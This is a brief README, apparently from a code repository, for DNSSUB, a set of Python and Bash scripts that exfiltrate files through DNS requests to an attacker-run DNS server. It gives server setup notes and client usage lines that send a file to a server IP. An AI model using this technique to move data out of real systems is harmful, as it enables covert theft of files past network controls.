# DNSSUB
Exfiltrate files over dns requests using Python and/or Bash

A quick set of scripts I done after seeing DNSFTP (https://github.com/breenmachine/dnsftp) 
I used some of Breenmachine's code in the scripts, The chunks function is very handy.
I also used Simple DNS server (https://gist.github.com/andreif/6069838) as a base dns server for this script.

Server Usage:
Run dnssub.py on your server which will bind to port 53 udp it will act like a dns server giving A records for the domain you enter in the script.
Client Usage: 
python client.py <file> <serverip>
./client.sh <file> <serverip>
